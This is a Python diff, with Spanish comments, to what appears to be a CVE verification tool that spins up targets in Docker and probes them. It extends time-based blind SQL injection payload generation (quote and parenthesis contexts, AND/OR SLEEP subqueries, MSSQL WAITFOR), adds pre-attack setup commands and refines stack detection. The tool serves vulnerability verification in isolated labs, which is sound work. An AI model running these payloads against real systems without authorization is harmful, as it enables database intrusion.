@@ -103,6 +103,33 @@ def _detect_bare_flask_entry(source_dir: str) -> Optional[str]:
     return candidates[0] if candidates else None
 
 
+def _package_json_has_runnable_entry(path: str) -> bool:
+    """package.json por si solo NO basta como senal de 'esto es una app Node que se puede
+    arrancar' -- un proyecto de OTRO stack puede traer uno solo para su pipeline de assets
+    front-end (gulp/sass/webpack), sin ningun servidor Node real detras. Confirmado en vivo
+    contra CVE-2026-9469 (StudentManagementSystem, PHP real): su package.json es el de la
+    plantilla Bootstrap "SB Admin" (startbootstrap-sb-admin) -- solo dependencies/devDependencies
+    de gulp/sass/jquery, SIN "main" NI "scripts" en absoluto -- y el orden de _STACK_SIGNALS
+    (package.json antes que composer.json/PHP suelto) lo detectaba como stack Node por error,
+    generando un Dockerfile que nunca llega a arrancar nada real (`npm start || node index.js
+    || ...` -- ninguno existe) y dejando el PHP real (y por tanto la SQLi real) sin alcanzar
+    nunca. Exige que declare como arrancarse de verdad: un "main" o un "scripts" no vacio (casi
+    toda app Node real trae al menos uno de los dos) -- si no trae ninguno, no es senal de
+    stack Node y se sigue probando el resto de _STACK_SIGNALS/deteccion PHP suelta."""
+    try:
+        import json
+        with open(path, "r", errors="ignore") as f:
+            data = json.load(f)
+    except (OSError, ValueError):
+        return False
+    if not isinstance(data, dict):
+        return False
+    if data.get("main"):
+        return True
+    scripts = data.get("scripts")
+    return bool(scripts) and isinstance(scripts, dict)
+
+
 def _detect_and_write_auto_dockerfile(source_dir: str) -> Optional[dict]:
     """Cuando el repo NO trae su propio Dockerfile/docker-compose.yml, detecta el stack por sus
     ficheros delatores (package.json/requirements.txt/composer.json, o sueltos .php) y ESCRIBE
@@ -112,13 +139,17 @@ def _detect_and_write_auto_dockerfile(source_dir: str) -> Optional[dict]:
     (_AUTO_DOCKERFILE_NAME) para que quede constancia de que NO es el del autor del PoC -- el
     `step()` del caller debe dejarlo igual de explicito en el informe."""
     for signal_file, base_image, port, run_lines in _STACK_SIGNALS:
-        if os.path.isfile(os.path.join(source_dir, signal_file)):
-            lines = [f"FROM {base_image}"] + run_lines + [f"EXPOSE {port}"]
-            path = os.path.join(source_dir, _AUTO_DOCKERFILE_NAME)
-            with open(path, "w") as f:
-                f.write("\n".join(lines) + "\n")
-            return {"kind": "dockerfile", "path": path, "context": source_dir,
-                   "auto_generado": True, "stack_detectado": signal_file}
+        signal_path = os.path.join(source_dir, signal_file)
+        if not os.path.isfile(signal_path):
+            continue
+        if signal_file == "package.json" and not _package_json_has_runnable_entry(signal_path):
+            continue
+        lines = [f"FROM {base_image}"] + run_lines + [f"EXPOSE {port}"]
+        path = os.path.join(source_dir, _AUTO_DOCKERFILE_NAME)
+        with open(path, "w") as f:
+            f.write("\n".join(lines) + "\n")
+        return {"kind": "dockerfile", "path": path, "context": source_dir,
+               "auto_generado": True, "stack_detectado": signal_file}
     flask_module = _detect_bare_flask_entry(source_dir)
     if flask_module:
         lines = ["FROM python:3.11-slim", "WORKDIR /app", "COPY . .",
@@ -364,10 +395,21 @@ class _GenericLab:
 
 
 def _bootstrap_generic_lab(source_dir: str, step, res: WpVerifyResult,
-                           budget_s: float) -> Optional[tuple]:
+                           budget_s: float, setup_commands: Optional[List[str]] = None) -> Optional[tuple]:
     """Pasos comunes a TODOS los verificadores genericos: detectar como arrancar el objetivo,
     construirlo/arrancarlo, y encontrar por donde habla HTTP. Devuelve (lab, base_url, container)
-    o None con `res` ya relleno (detail/logs/limitations) -- el caller solo tiene que `return res`."""
+    o None con `res` ya relleno (detail/logs/limitations) -- el caller solo tiene que `return res`.
+
+    `setup_commands` (opcional): comandos de shell reales, ejecutados via `docker exec` DENTRO del
+    contenedor ya arriba, DESPUES de confirmar que responde HTTP pero ANTES de lanzar cualquier
+    ataque -- analogo generico del `extra_setup_script` que drupalverify.py ya tiene para Views
+    que necesitan contenido real. Confirmado como necesario en vivo contra CVE-2026-65694
+    (Microweber): el framework (Laravel) responde HTTP 200 en CUALQUIER ruta mientras la app no
+    esta instalada (migraciones/base de datos), incluida la propia ruta vulnerable -- sin esto,
+    cualquier generico que arranque el objetivo con `docker compose up` a secas prueba contra una
+    app a medio arrancar y nunca llega al codigo real, sea o no vulnerable (falso negativo por
+    entorno, no por el payload). Si CUALQUIER comando falla, se aborta con el detalle real en vez
+    de seguir probando contra un objetivo que sabemos a medias."""
     target = _find_build_target(source_dir)
     if target is None:
         res.detail = ("no se encontro Dockerfile ni docker-compose.yml en el codigo descargado, "
@@ -412,6 +454,18 @@ def _bootstrap_generic_lab(source_dir: str, step, res: WpVerifyResult,
     container, port = found_http
     base_url = f"http://{_lab_host()}:{port}"
     step(f"objetivo arriba: {base_url} (contenedor '{container}')")
+
+    for cmd in (setup_commands or []):
+        step(f"ejecutando paso de configuracion real dentro del contenedor: {cmd!r}...")
+        r = lab.sh("exec", container, "sh", "-c", cmd, timeout=180)
+        if r.returncode != 0:
+            res.detail = (f"el paso de configuracion {cmd!r} fallo (codigo {r.returncode}): "
+                          f"{(r.stderr or r.stdout or '')[-500:]}")
+            res.logs.append(f"setup_commands[{cmd!r}] stdout/stderr:\n"
+                            f"{(r.stdout or '')}\n{(r.stderr or '')}")
+            lab.teardown()
+            return None
+
     return (lab, base_url, container)
 
 
@@ -537,13 +591,18 @@ def verify_generic_command_injection(
 def verify_generic_path_traversal(
     source_dir: str, endpoint: str, http_method: str, parameters,
     path_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
-    budget_s: float = 900.0,
+    budget_s: float = 900.0, setup_commands: Optional[List[str]] = None,
 ) -> WpVerifyResult:
     """Analogo generico de verify_wordpress_path_traversal (wpverify.py): planta un fichero
     canario con un secreto aleatorio DENTRO del contenedor real del objetivo (via `docker exec`,
     fuera de cualquier directorio de la app) y prueba las mismas variantes de profundidad/
     codificacion de '../' -- el mecanismo de prueba (leer un fichero del propio sistema de
-    ficheros del contenedor) no depende del stack, asi que vale igual aqui que en WordPress."""
+    ficheros del contenedor) no depende del stack, asi que vale igual aqui que en WordPress.
+
+    `setup_commands` (opcional, ver _bootstrap_generic_lab): comandos reales ejecutados dentro
+    del contenedor DESPUES de arrancar y ANTES de atacar -- necesario para frameworks (Laravel/
+    Microweber confirmado en vivo con CVE-2026-65694) que exigen una instalacion/migracion real
+    antes de que sus rutas se comporten como en produccion."""
     step = on_step or (lambda _m: None)
     res = WpVerifyResult()
     if not _docker_daemon_ok():
@@ -560,7 +619,7 @@ def verify_generic_path_traversal(
                                "mano (path_param_hint)")
         return res
 
-    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
+    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s, setup_commands=setup_commands)
     if boot is None:
         return res
     lab, base_url, container = boot
@@ -1112,8 +1171,37 @@ def verify_generic_ssrf(
 # nada y la peticion tarda lo normal (no es un falso positivo).
 _SQLI_SLEEP_SECONDS = 4.0
 _SQLI_SLEEP_EXPRS = (f"SLEEP({_SQLI_SLEEP_SECONDS:.0f})", f"pg_sleep({_SQLI_SLEEP_SECONDS:.0f})")
-_SQLI_CONTEXTS = ("", "'", '"', "')", '")')
+# _LEGACY_SQLI_CONTEXTS en joomlaverify.py probo en vivo (CVE-2025-40636, mod_vvisit_counter
+# 2.0.4j3: WHERE ip=UNHEX(SHA1('$ip')), payload ganador real necesito exactamente DOS parentesis
+# de cierre) que el SQL real nido con frecuencia el valor contaminado dentro de llamadas a
+# funcion, no solo un simple WHERE col='$val'. Ese mismo gap aplicaba aqui: esta lista solo
+# cerraba UN nivel de parentesis -- se amplia con las mismas variantes de DOS y TRES niveles ya
+# probadas, para ambos estilos de comilla.
+_SQLI_CONTEXTS = ("", "'", "')", "'))", "')))", '"', '")', '"))', '")))')
 _SQLI_COMMENTS = ("-- -", "#")
+# Confirmado en vivo contra CVE-2026-9469 (StudentManagementSystem /success.php, `user` ->
+# "SELECT * FROM admin WHERE user='$user' AND password='$hash'"): el bucle de abajo SOLO
+# probaba "<val> AND <sleep>", que requiere que <val> YA machee una fila real -- en un
+# formulario de login probado con un usuario que no existe (el caso MAS comun, nadie conoce ya
+# una cuenta valida de antemano), MySQL cortocircuita el AND por fila sin llegar a evaluar
+# SLEEP() nunca, y el payload no retrasa nada aunque la inyeccion sea real (confirmado: 0.0s en
+# 45/45 combinaciones AND contra el admin real). "OR <sleep>" si fuerza la evaluacion sin
+# necesitar fila que machee, pero SLEEP() en bruto dentro de un OR se evalua UNA VEZ POR FILA
+# escaneada (no cortocircuita, porque SLEEP() siempre devuelve 0/falso) -- confirmado en vivo:
+# contra la tabla `admin` real (6 filas), "OR SLEEP(4)" tardo ~24s (6 x 4s), no ~4s, y ese
+# retraso crece con el tamano de la tabla sin limite, arriesgando superar el timeout de la
+# peticion (_SQLI_SLEEP_SECONDS + 15s) en tablas mas grandes. Envolver el SLEEP en una subquery
+# derivada sin correlacion ("SELECT 1 FROM (SELECT SLEEP(n)) x") la fuerza a materializarse UNA
+# SOLA VEZ por ejecucion de consulta en vez de una vez por fila -- confirmado en vivo: mismo
+# "OR" contra la misma tabla de 6 filas, ~4.0s en vez de ~24s. Se usa solo para "OR" (donde la
+# multiplicacion es real); "AND" sigue con el SLEEP() en bruto que 09e1daf ya probo en vivo.
+_SQLI_BOOLEAN_OPS = ("AND", "OR")
+
+
+def _sqli_sleep_clause(op: str, sleep_expr: str) -> str:
+    if op == "OR":
+        return f"(SELECT 1 FROM (SELECT {sleep_expr}) binoracle_sqli_sleep)"
+    return sleep_expr
 
 
 def verify_generic_sqli_blind(
@@ -1131,7 +1219,16 @@ def verify_generic_sqli_blind(
     Prueba dura contra falsos positivos por jitter de red/Docker: toma la MEDIANA de 2 peticiones
     de control (sin inyeccion) como linea base, y solo marca `verified=True` si el payload
     produce un retraso consistente (>= la mitad del SLEEP pedido) en las 2 repeticiones
-    independientes de la MISMA peticion, no en una sola medida que podria ser ruido."""
+    independientes de la MISMA peticion, no en una sola medida que podria ser ruido.
+
+    Prueba AMBOS combinadores booleanos (AND y OR, ver _SQLI_BOOLEAN_OPS) -- "AND <sleep>" solo
+    retrasa si el valor original YA machea una fila real (CMS-especificos como wpverify suelen
+    saberlo de antemano por el login), pero un formulario generico probado sin credenciales
+    validas nunca la machea, y MySQL cortocircuita el AND por fila sin llegar a evaluar SLEEP()
+    -- confirmado en vivo contra CVE-2026-9469. "OR <sleep>" no necesita fila que machee, pero
+    SLEEP() en bruto dentro de un OR se evalua una vez POR FILA escaneada (el retraso crece con
+    el tamano de la tabla); se envuelve en una subquery derivada sin correlacion para forzar una
+    sola evaluacion por consulta, no por fila (ver _sqli_sleep_clause)."""
     step = on_step or (lambda _m: None)
     res = WpVerifyResult()
     if not _docker_daemon_ok():
@@ -1197,24 +1294,28 @@ def verify_generic_sqli_blind(
             for sleep_expr in _SQLI_SLEEP_EXPRS:
                 if found:
                     break
-                for cm in _SQLI_COMMENTS:
-                    payload_val = f"{orig_value}{ctx} AND {sleep_expr}{cm}"
-                    step(f"probando {m} {endpoint} con {sqli_param}={payload_val!r} (time-based)...")
-                    t1 = timed_send(payload_val)
-                    t2 = timed_send(payload_val)
-                    entry = {"payload": payload_val, "tiempo_1_s": round(t1, 2) if t1 else None,
-                             "tiempo_2_s": round(t2, 2) if t2 else None}
-                    tried.append(entry)
-                    if t1 is not None and t2 is not None and t1 >= threshold and t2 >= threshold:
-                        found = True
-                        res.evidence["payload_ganador"] = payload_val
-                        res.evidence["tiempo_1_ganador_s"] = round(t1, 2)
-                        res.evidence["tiempo_2_ganador_s"] = round(t2, 2)
-                        step(f"VERIFICADO: {sqli_param}={payload_val!r} retraso la respuesta "
-                             f"~{round((t1+t2)/2, 1)}s de forma CONSISTENTE en 2 repeticiones "
-                             f"independientes (linea base {round(base_median, 1)}s) -- SQLi ciega "
-                             f"por tiempo, no ruido de red/Docker.")
+                for op in _SQLI_BOOLEAN_OPS:
+                    if found:
                         break
+                    clause = _sqli_sleep_clause(op, sleep_expr)
+                    for cm in _SQLI_COMMENTS:
+                        payload_val = f"{orig_value}{ctx} {op} {clause}{cm}"
+                        step(f"probando {m} {endpoint} con {sqli_param}={payload_val!r} (time-based)...")
+                        t1 = timed_send(payload_val)
+                        t2 = timed_send(payload_val)
+                        entry = {"payload": payload_val, "tiempo_1_s": round(t1, 2) if t1 else None,
+                                 "tiempo_2_s": round(t2, 2) if t2 else None}
+                        tried.append(entry)
+                        if t1 is not None and t2 is not None and t1 >= threshold and t2 >= threshold:
+                            found = True
+                            res.evidence["payload_ganador"] = payload_val
+                            res.evidence["tiempo_1_ganador_s"] = round(t1, 2)
+                            res.evidence["tiempo_2_ganador_s"] = round(t2, 2)
+                            step(f"VERIFICADO: {sqli_param}={payload_val!r} retraso la respuesta "
+                                 f"~{round((t1+t2)/2, 1)}s de forma CONSISTENTE en 2 repeticiones "
+                                 f"independientes (linea base {round(base_median, 1)}s) -- SQLi ciega "
+                                 f"por tiempo, no ruido de red/Docker.")
+                            break
 
         # MSSQL: WAITFOR DELAY es una INSTRUCCION, no una funcion que valga dentro de un AND/OR --
         # necesita una query APILADA (';' cierra el SELECT original y abre una nueva). Casuistica
@@ -1223,7 +1324,7 @@ def verify_generic_sqli_blind(
         # dentro de una condicion AND/OR).
         if not found:
             waitfor_secs = f"0:0:{_SQLI_SLEEP_SECONDS:.0f}"
-            for ctx in ("", "'", "')", '")'):
+            for ctx in _SQLI_CONTEXTS:
                 if found:
                     break
                 payload_val = f"{orig_value}{ctx};WAITFOR DELAY '{waitfor_secs}'--"
